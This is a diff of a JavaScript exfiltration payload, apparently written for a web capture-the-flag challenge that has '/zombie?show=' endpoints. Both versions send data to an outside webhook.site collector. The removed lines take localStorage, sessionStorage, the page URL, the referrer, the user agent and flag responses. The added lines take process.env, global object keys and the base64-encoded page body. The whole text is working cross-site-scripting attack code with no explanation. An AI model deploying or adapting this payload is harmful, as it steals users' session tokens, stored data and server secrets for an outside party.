@@ -1,10 +1,12 @@
 var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
-fetch(w+'/ls?d='+encodeURIComponent(JSON.stringify(localStorage)));
-fetch(w+'/ss?d='+encodeURIComponent(JSON.stringify(sessionStorage)));
-fetch(w+'/title?d='+encodeURIComponent(document.title));
-fetch(w+'/loc?d='+encodeURIComponent(location.href));
-fetch(w+'/ref?d='+encodeURIComponent(document.referrer));
-fetch(w+'/ua?d='+encodeURIComponent(navigator.userAgent));
-fetch('/zombie?show=flag').then(r=>{var h='';r.headers.forEach((v,k)=>h+=k+':'+v+'|');r.text().then(t=>fetch(w+'/zflag?d='+encodeURIComponent(t)+'&h='+encodeURIComponent(h)))});
-fetch('/zombie?show=wctf').then(r=>r.text()).then(t=>fetch(w+'/zwctf?d='+encodeURIComponent(t)));
-fetch('/robots.txt').then(r=>r.text()).then(t=>fetch(w+'/robots?d='+encodeURIComponent(t)));
+try {
+  var env = typeof process !== 'undefined' ? JSON.stringify(process.env) : 'no process';
+  fetch(w+'/env?d='+encodeURIComponent(env));
+} catch(e) { fetch(w+'/env_err?d='+encodeURIComponent(e+'')) }
+try {
+  var g = typeof global !== 'undefined' ? Object.keys(global).slice(0,50).join(',') : 'no global';
+  fetch(w+'/global?d='+encodeURIComponent(g));
+} catch(e) { fetch(w+'/g_err?d='+encodeURIComponent(e+'')) }
+try { fetch(w+'/btoa?d='+btoa(document.body.innerHTML)) } catch(e) {}
+fetch('/zombie?show=The+Walking+Dead').then(r=>r.text()).then(t=>fetch(w+'/twd?d='+encodeURIComponent(t)));
+fetch('/zombie?show=shaun').then(r=>r.text()).then(t=>fetch(w+'/shaun?d='+encodeURIComponent(t)));
